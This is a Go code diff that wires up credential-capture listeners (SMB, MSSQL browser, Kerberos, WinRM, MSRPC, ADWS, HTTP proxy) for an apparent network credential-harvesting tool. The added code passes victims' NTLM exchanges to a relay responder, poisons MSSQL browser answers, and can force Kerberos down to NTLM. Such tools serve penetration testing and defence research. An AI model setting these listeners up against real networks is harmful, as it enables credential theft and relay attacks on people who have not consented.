@@ -5,6 +5,10 @@ import (
 	log "github.com/sirupsen/logrus"
 )
 
+// relayResponder is nil unless relaying is configured; when set, the
+// listeners that can relay hand it their victims' NTLM exchanges.
+var relayResponder flamingo.NTLMResponder
+
 // listenerSpawner starts one listener on the given port and returns its shutdown function.
 type listenerSpawner func(port uint16) (shutdown func(), err error)
 
@@ -189,5 +193,118 @@ func setupRDP(rw *flamingo.RecordWriter) {
 		conf.TLSKey = params.TLSKeyData
 		conf.TLSName = params.TLSName
 		return conf.Shutdown, flamingo.SpawnRDP(conf)
+	})
+}
+
+func setupSMB(rw *flamingo.RecordWriter) {
+	startListeners("smb", params.SMBPorts, func(port uint16) (func(), error) {
+		conf := flamingo.NewConfSMB()
+		conf.BindPort = port
+		conf.RecordWriter = rw
+		conf.Responder = relayResponder
+		return conf.Shutdown, flamingo.SpawnSMB(conf)
+	})
+}
+
+func setupMSSQLBrowser(rw *flamingo.RecordWriter) {
+	startListeners("mssql-browser", params.MSSQLBrowserPorts, func(port uint16) (func(), error) {
+		conf := flamingo.NewConfMSSQLBrowser()
+		conf.BindPort = port
+		conf.RecordWriter = rw
+		conf.Policy = poisonPolicy()
+		conf.AnswerBroadcast = poisonParams.AnswerBroadcast
+		// Point discovered clients at the MSSQL collector, so a host that
+		// finds us through the browser then authenticates to us.
+		if ports, err := flamingo.CrackPorts(params.MSSQLPorts); err == nil && len(ports) > 0 {
+			conf.TargetPort = uint16(ports[0])
+		}
+		return conf.Shutdown, flamingo.SpawnMSSQLBrowser(conf)
+	})
+}
+
+func setupKerberos(rw *flamingo.RecordWriter) {
+	startListeners("kerberos", params.KerberosPorts, func(port uint16) (func(), error) {
+		conf := flamingo.NewConfKerberos()
+		conf.BindPort = port
+		conf.RecordWriter = rw
+		conf.ForceNTLM = params.KerberosForceNTLM
+		return conf.Shutdown, flamingo.SpawnKerberos(conf)
+	})
+}
+
+func setupMQTT(rw *flamingo.RecordWriter) {
+	startListeners("mqtt", params.MQTTPorts, func(port uint16) (func(), error) {
+		conf := flamingo.NewConfMQTT()
+		conf.BindPort = port
+		conf.RecordWriter = rw
+		return conf.Shutdown, flamingo.SpawnMQTT(conf)
+	})
+}
+
+// setupHTTPProxy starts the authenticating proxy listeners. The proxy only
+// ever answers 407, so it transmits nothing unsolicited and is on by default;
+// serving a WPAD file, which actively redirects a client's traffic, is not.
+func setupHTTPProxy(rw *flamingo.RecordWriter) {
+	startListeners("http-proxy", params.HTTPProxyPorts, func(port uint16) (func(), error) {
+		conf := flamingo.NewConfHTTP()
+		conf.BindPort = port
+		conf.RecordWriter = rw
+		conf.BasicRealm = params.HTTPBasicRealm
+		conf.AuthMode = params.HTTPAuthMode
+		conf.ProxyAuth = true
+		return conf.Shutdown, flamingo.SpawnHTTP(conf)
+	})
+}
+
+// wpadProxyPort is the port a served WPAD file points clients at: the first
+// --http-proxy-ports value, so --http-wpad alone needs no further flags.
+func wpadProxyPort() uint16 {
+	ports, err := flamingo.CrackPorts(params.HTTPProxyPorts)
+	if err != nil || len(ports) == 0 {
+		return 3128
+	}
+	return uint16(ports[0])
+}
+
+func setupMSRPC(rw *flamingo.RecordWriter) {
+	startListeners("msrpc", params.MSRPCPorts, func(port uint16) (func(), error) {
+		conf := flamingo.NewConfMSRPC()
+		conf.BindPort = port
+		conf.RecordWriter = rw
+		conf.Responder = relayResponder
+		return conf.Shutdown, flamingo.SpawnMSRPC(conf)
+	})
+}
+
+func setupWinRM(rw *flamingo.RecordWriter) {
+	startListeners("winrm", params.WinRMPorts, func(port uint16) (func(), error) {
+		conf := flamingo.NewConfWinRM()
+		conf.BindPort = port
+		conf.RecordWriter = rw
+		conf.Responder = relayResponder
+		return conf.Shutdown, flamingo.SpawnWinRM(conf)
+	})
+}
+
+func setupWinRMS(rw *flamingo.RecordWriter) {
+	startListeners("winrms", params.WinRMSPorts, func(port uint16) (func(), error) {
+		conf := flamingo.NewConfWinRMS()
+		conf.BindPort = port
+		conf.RecordWriter = rw
+		conf.Responder = relayResponder
+		conf.TLSCert = params.TLSCertData
+		conf.TLSKey = params.TLSKeyData
+		conf.TLSName = params.TLSName
+		return conf.Shutdown, flamingo.SpawnWinRMS(conf)
+	})
+}
+
+func setupADWS(rw *flamingo.RecordWriter) {
+	startListeners("adws", params.ADWSPorts, func(port uint16) (func(), error) {
+		conf := flamingo.NewConfADWS()
+		conf.BindPort = port
+		conf.RecordWriter = rw
+		conf.Responder = relayResponder
+		return conf.Shutdown, flamingo.SpawnADWS(conf)
 	})
 }
